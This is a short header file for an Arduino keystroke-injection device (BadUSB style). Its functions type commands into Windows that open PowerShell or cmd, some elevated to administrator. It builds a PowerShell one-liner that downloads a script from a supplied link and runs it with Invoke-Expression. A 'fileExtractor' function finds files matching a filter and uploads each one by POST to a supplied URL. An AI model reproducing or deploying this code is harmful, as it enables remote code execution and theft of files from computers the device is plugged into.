#ifndef C_INSTRUCTIONS_H
#define C_INSTRUCTIONS_H

#include <Keyboard.h>
// #include "simple-instructions.h"

// Notepad
void openNotepad() // Open Notepad
{
    run();
    Keyboard.println("notepad");
    delay(1000);
}

// PowerShell
void openPowerShell()
{
    run();
    Keyboard.println("powershell");
    delay(1000);
}

void openPowerShellAdmin()
{
    run();
    Keyboard.print("powershell");
    admin();
    delay(1000);
}

void execPowerShellScript(String link)
{
    openPowerShell();
    String powerShellCommand = "Invoke-Expression (Invoke-WebRequest -Uri \"" + link + "\").Content";
    Keyboard.println(powerShellCommand);
}

void execPowerShellScriptAdmin(String link)
{
    openPowerShellAdmin();
    String powerShellCommand = "Invoke-Expression (Invoke-WebRequest -Uri \"" + link + "\").Content";
    Keyboard.println(powerShellCommand);
}

// CMD
void openCmd()
{
    run();
    Keyboard.println("cmd");
    delay(1000);
}

void openCmdAdmin()
{
    run();
    Keyboard.print("cmd");
    admin();
    delay(1000);
}

void execCmd(String command)
{
    openCmd();
    Keyboard.println(command);
}

void execCmdAdmin(String command)
{
    openCmdAdmin();
    Keyboard.println(command);
}

// File
void fileExtractor(String path, String file, String link)
{
    openPowerShell();
    String powerShellCommand = "Get-ChildItem -Path \"" + path + "\" -Filter \"" + file + "\" | ForEach-Object { Invoke-WebRequest -Uri \"" + link + "\" -Method Post -InFile $_.FullName }";
    Keyboard.println(powerShellCommand);
}

#endif